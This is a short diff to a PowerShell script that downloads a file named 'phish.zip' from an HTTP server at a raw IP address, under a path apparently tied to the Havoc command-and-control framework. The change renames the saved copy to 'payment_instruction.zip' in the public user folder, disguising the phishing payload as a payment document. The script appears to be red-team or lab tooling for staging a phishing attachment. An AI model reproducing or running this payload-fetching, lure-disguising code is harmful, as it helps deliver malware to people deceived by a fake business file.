@@ -1,6 +1,6 @@
 # Define the URL of the hosted file and the local path to save it
 $attachmentUrl = "http://198.18.128.188:8000/havoc/phish.zip"
-$localAttachmentPath = "C:\phish.zip"
+$localAttachmentPath = "C:\Users\Public\payment_instruction.zip"
 
 # Download the file from the HTTP server
 Invoke-WebRequest -Uri $attachmentUrl -OutFile $localAttachmentPath
